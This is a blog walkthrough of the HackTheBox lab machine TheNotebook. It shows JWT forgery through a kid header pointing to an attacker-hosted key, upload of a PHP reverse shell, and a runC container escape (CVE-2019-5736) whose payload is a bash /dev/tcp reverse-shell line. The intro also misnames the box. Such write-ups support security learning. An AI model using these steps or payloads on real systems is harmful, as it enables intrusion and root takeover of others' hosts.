---
layout: walkthrough
title: HackTheBox - TheNotebook
date: 2021-08-01 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/thenotebook.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at Blunder --`10.10.10.188`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/Overview.png"  style="width: 65%" />
</p>

## Information Gathering

In order to start the VM, I started with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/TheNotebook$ nmap -sC -sV 10.10.10.230
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 08:55 EDT
Nmap scan report for 10.10.10.230
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.42 seconds
```

</details>


From the output shown above, we can see that the machine is a Linux machine. As this is a Linux machine and it only has 2 open ports, I started by navigating to the web application:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img1.png"  style="width: 80%" />
</p>

After registering an account, I was able to log in to the application and I was presented with a note stating that I could view my notes in the `/notes` tab:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img2.png"  style="width: 80%" />
</p>

Any note was in the form of a `Title` and `Note`, after which it would be saved to your user profile:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img3.png"  style="width: 80%" />
</p>

I attempted to create various payloads, but there appeared to be pretty solid entity encoding within the application. I went back to the Burpsuite requests and noticed that the cookie contained a JWT token:

```json
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImhvdHNob3RvIiwiZW1haWwiOiJob3RzaG90b0BodGIuY29tIiwiYWRtaW5fY2FwIjowfQ.BF8Rj0ju9AeecSavFOLM8K2OGGHE7YDVPhiHkJDrwMer4xmCSQhm8TYJoF_E236QjXtM7asv2lXQwSajTREYb-br5TwHwdzS_ABqWYN9R5JSbUU_mGxbjnlsSoGFei1Id7GkGB0WeKJu9KYE7rrhLajxJP3TjSmQAhmRGGQvwcdZ1KO4YCL7QbEFQtZ7y3WkBipR9WZA0iQgT3Fm5H09B4biGbbjrrg_ptZ6q3UqGys6PlOhFFpPbhU1cK5FvzBDjYytqC9__Hsi6BYPTrJWuJ4atKJeK3IIIH1yKndzIT5KIozBgm9P_zS-LQ5s_L0HnMv7l6KnLkPAa_AzI5cGy3SVw0Fgr8T9RLc7oPK6nEFxR2O7fwy7k5JjHxccUONhhT0hfBbuwDnSJQnSJ0ZZFR3fxEsbd11-i93J2kDBuuiNwnqeMBeFlxnSrTGu1J8Zf0ydy_-R52EzVJ-ACwQqAAByIzQsyjbgIaewZz_sdnlZ4nM140BLO84ZcL2ARrA-R5V5_04mWVkbBw-npuw7HsAUBSeRwsdIPrleep6GbVbrjx0J5k9KvSpeoIqI0A0AL2HgxrAe6LCq7y8vxqSUgZZiNba2e35_hVYNsAoUGG0DxDJA9aiJU6lGwPLRmij2Ku7JCYqfJ2SkL1tLAt6zAaz4cd6ZUPupZzZIL1yjNuk; uuid=5cce1a30-23ae-4a29-9a7c-fa8d061f5549

```

I decoded this JWT token using Burpsuite's JWT Decoder which resulted in the following:

```json
Headers = {
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://localhost:7070/privKey.key"
}

Payload = {
  "username": "hotshoto",
  "email": "hotshoto@htb.com",
  "admin_cap": 0
}

Signature = "BF8Rj0ju9AeecSavFOLM8K2OGGHE7YDVPhiHkJDrwMer4xmCSQhm8TYJoF_E236QjXtM7asv2lXQwSajTREYb-br5TwHwdzS_ABqWYN9R5JSbUU_mGxbjnlsSoGFei1Id7GkGB0WeKJu9KYE7rrhLajxJP3TjSmQAhmRGGQvwcdZ1KO4YCL7QbEFQtZ7y3WkBipR9WZA0iQgT3Fm5H09B4biGbbjrrg_ptZ6q3UqGys6PlOhFFpPbhU1cK5FvzBDjYytqC9__Hsi6BYPTrJWuJ4atKJeK3IIIH1yKndzIT5KIozBgm9P_zS-LQ5s_L0HnMv7l6KnLkPAa_AzI5cGy3SVw0Fgr8T9RLc7oPK6nEFxR2O7fwy7k5JjHxccUONhhT0hfBbuwDnSJQnSJ0ZZFR3fxEsbd11-i93J2kDBuuiNwnqeMBeFlxnSrTGu1J8Zf0ydy_-R52EzVJ-ACwQqAAByIzQsyjbgIaewZz_sdnlZ4nM140BLO84ZcL2ARrA-R5V5_04mWVkbBw-npuw7HsAUBSeRwsdIPrleep6GbVbrjx0J5k9KvSpeoIqI0A0AL2HgxrAe6LCq7y8vxqSUgZZiNba2e35_hVYNsAoUGG0DxDJA9aiJU6lGwPLRmij2Ku7JCYqfJ2SkL1tLAt6zAaz4cd6ZUPupZzZIL1yjNuk"
```

As shown above, the JWT token made use of a `kid` header which is an optional header claim which holds a key identifier and it contains the path of the secret key to be used for signing the token.  Additionally, it contained an `admin_cap` parameter within the Payload section. I did a quick Google search for exploiting `kid` within JWT's and came across the following blog post: <https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-command-injection-e7f5b9def146>.


I needed to start off by generating an SSH key pair using the following commands:
```bash
ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub
```

In order to exploit this, I changed the `kid` value to point to my host and I changed the `admin_cap` to 1:
```json
Headers = {
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://10.10.14.73:7070/privKey.key"
}

Payload = {
  "username": "hotshoto",
  "email": "hotshoto@htb.com",
  "admin_cap": 1
}

```
With these changes in effect, I changed the cookie value in the browser storage, refreshed, and I had access to the admin panel:

```bash
echo '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.73:7070/privKey.key"}' |base64
echo '{ "username": "hotshoto","email": "hotshoto@htb.com","admin_cap":1}' |base64
```
I managed to get a connection to my server which implied that it was retrieving the file, however I got stuck at this point for a while:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img4.png"  style="width: 80%" />
</p>


Eventually, I realised that I wasn't creating the new token with the correct signature, so I added in the public and private key information, generated the new key and I was redirected to the admin panel:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img5.png"  style="width: 80%" />
</p>

The admin panel had an `Upload File` section which I used to upload a simple PHP reverse shell:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img6.png"  style="width: 80%" />
</p>


## Lateral Movement using WWW-Data

I started off by enumerating the web directory and came across `/var/backups`. This directory included a few files as well as a file called `home.tar.gz`. I unzipped the file and it contained the host directory information for the `noah` user:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img7.png"  style="width: 80%" />
</p>

I extracted the `id_rsa` key for `noah` and logged into the host via SSH.


## Privilege Escalation using Noah

Now that I had access to the `noah` user, I started off by doing some basic enumeration. I ran the `sudo -l` command and found that I was able to run `docker exec` on a webapp directory:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img8.png"  style="width: 80%" />
</p>

Docker exec enables you to run a command in a running container: <https://docs.docker.com/engine/reference/commandline/exec/>. I started off by running the command and appending `/bin/bash` to the end which successfully gave me a root shell within the docker container:


<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img9.png"  style="width: 80%" />
</p>


At this point, I needed to figure out a method to break out of the docker container. I did some searching and found a blog post on Docker breakouts using runC: <https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/>. The blog contains some fantastic information if you want to learn more about the vulnerability. 


> The vulnerability allows a malicious container to (with minimal  user interaction) overwrite the host runc binary and thus gain  root-level code execution on the host. The level of user interaction is  being able to run any command ... as root within a container in either  of these contexts:
> Creating a new container using an attacker-controlled image.
> Attaching (docker exec) into an existing container which the attacker had previous write access to.


At this point I looked for some PoC code and came across the following Github project: <https://github.com/Frichetten/CVE-2019-5736-PoC>. In order to run the exploit, I needed to do the following:

> Modify the code however you see fit and compile it with go build main.go. Move that binary to the container you'd like to escape from. Execute the binary, and then the next time someone attaches to it and calls /bin/sh your payload will fire.

I created a simple payload which would return a reverse shell, as shown below:

```bash
var payload = "#!/bin/bash \n bash -i >& /dev/tcp/10.10.14.73/1234 0>&1"
```

Once I had the payload, I did the following:
* In the exploited docker container, I retrieved the newly created exploit
* Added execute permissions to the file (`chmod +x notebook_exploit`)
* Ran the exploit (`./notebook_exploit`)
* In another SSH terminal, I called `/bin/sh` using the sudo permissions (`/usr/bin/docker exec -it webapp-dev01 /bin/sh`)

By running these commands in the order shown above, I was able to exploit the runC vulnerability and obtain a root shell:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/TheNotebook/img10.png"  style="width: 80%" />
</p>



That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.